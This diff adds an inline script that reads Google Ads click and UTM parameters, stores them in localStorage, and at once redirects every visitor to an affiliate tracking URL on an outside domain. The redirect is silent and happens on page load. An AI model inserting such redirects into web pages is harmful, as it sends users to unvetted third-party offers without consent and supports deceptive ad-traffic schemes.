@@ -1,0 +1,39 @@
+    <script>
+        (function () {
+            function safeDecode(value) {
+                try {
+                    return decodeURIComponent(decodeURIComponent(value));
+                } catch (e) {
+                    try {
+                        return decodeURIComponent(value);
+                    } catch {
+                        return value;
+                    }
+                }
+            }
+
+            function getURLParameter(name) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const rawValue = urlParams.get(name);
+                return rawValue ? safeDecode(rawValue) : null;
+            }
+
+            let gclid = getURLParameter('gclid') || localStorage.getItem('gclid') || '0';
+            let utmTerm = getURLParameter('utm_term') || localStorage.getItem('utm_term') || '0';
+
+            // 存入 localStorage 方便后续使用
+            localStorage.setItem('gclid', gclid);
+            localStorage.setItem('utm_term', utmTerm);
+
+            // 构造跳转 URL
+            const targetUrl = 'https://gtmorepcs.com/?a=38429&c=35160&s1='
+                + '&s1=Google&s2=XHD'
+                + '&s3=AW-16992410965/wVD3CO-2-rcaENW6zqY_'
+                + '&s4=de-h026.onrender.com'
+                + '&s5=' + encodeURIComponent(gclid)
+                + '&utm_term=' + encodeURIComponent(utmTerm);
+
+            // 执行跳转
+            window.location.href = targetUrl;
+        })();
+    </script>
